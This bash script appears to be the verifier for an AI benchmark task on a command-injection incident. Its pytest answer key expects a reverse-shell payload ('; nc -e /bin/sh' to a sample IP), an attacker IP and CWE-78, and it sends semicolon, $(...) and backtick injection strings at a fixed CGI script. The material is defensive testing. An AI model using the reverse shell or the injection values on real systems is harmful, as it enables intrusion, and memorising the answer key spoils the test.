#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import subprocess
import uuid
import pytest


def run_cgi(path, query_string):
    env = os.environ.copy()
    env["QUERY_STRING"] = query_string
    return subprocess.run(
        [path],
        env=env,
        capture_output=True,
        text=True,
        timeout=5,
    )


def test_attacker_payload():
    path = "/home/user/attacker_payload.txt"
    assert os.path.exists(path), f"{path} does not exist"
    with open(path, "r") as f:
        content = f.read().strip()
    assert content == "; nc -e /bin/sh 10.10.10.10 4444", f"Incorrect payload in {path}: {content}"


def test_attacker_ip():
    path = "/home/user/attacker_ip.txt"
    assert os.path.exists(path), f"{path} does not exist"
    with open(path, "r") as f:
        content = f.read().strip()
    assert content == "172.16.4.101", f"Incorrect IP in {path}: {content}"


def test_cwe_id():
    path = "/home/user/cwe_id.txt"
    assert os.path.exists(path), f"{path} does not exist"
    with open(path, "r") as f:
        content = f.read().strip().upper()
    assert content in ["CWE-78", "CWE-77"], f"Incorrect CWE ID in {path}: {content}"


def test_secure_search_cgi():
    path = "/home/user/secure_search.cgi"
    assert os.path.exists(path), f"{path} does not exist"
    assert os.path.isfile(path), f"{path} is not a file"
    assert os.access(path, os.X_OK), f"{path} is not executable"

    os.makedirs("/var/www", exist_ok=True)
    with open("/var/www/data.txt", "w") as f:
        f.write("dummy data\n")

    # Preserve the original command-injection check.
    result = run_cgi(path, "q=;echo INJECTION_SUCCESS")
    assert "INJECTION_SUCCESS" not in result.stdout, "Command injection still possible in secure_search.cgi"
    assert "INJECTION_SUCCESS" not in result.stderr, "Command injection still possible in secure_search.cgi"

    # Exercise legitimate searches using unpredictable, verifier-derived data.
    for _ in range(3):
        token = "Needle" + uuid.uuid4().hex
        first = "first-result-" + uuid.uuid4().hex + "-" + token
        second = "second-result-" + uuid.uuid4().hex + "-" + token.swapcase()
        unrelated = "unrelated-" + uuid.uuid4().hex
        with open("/var/www/data.txt", "w") as f:
            f.write(first + "\n")
            f.write(unrelated + "\n")
            f.write(second + "\n")

        result = run_cgi(path, "q=" + token)
        assert first in result.stdout, "secure_search.cgi did not return a legitimate matching result"
        assert second in result.stdout, "secure_search.cgi did not preserve case-insensitive alphanumeric search"
        assert unrelated not in result.stdout, "secure_search.cgi returned a non-matching record"

    # Check actual side effects for several shell-evaluation forms, using fresh paths.
    with open("/var/www/data.txt", "w") as f:
        f.write("harmless searchable content\n")

    targets_and_queries = []
    target = "/tmp/secure_search_semicolon_" + uuid.uuid4().hex
    targets_and_queries.append((target, f"q=nomatch; touch {target}; #"))
    target = "/tmp/secure_search_substitution_" + uuid.uuid4().hex
    targets_and_queries.append((target, f"q=nomatch$(touch {target})"))
    target = "/tmp/secure_search_backtick_" + uuid.uuid4().hex
    targets_and_queries.append((target, f"q=nomatch`touch {target}`"))

    for target, query in targets_and_queries:
        if os.path.exists(target):
            os.unlink(target)
        run_cgi(path, query)
        assert not os.path.exists(target), f"Command injection created {target}"


TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
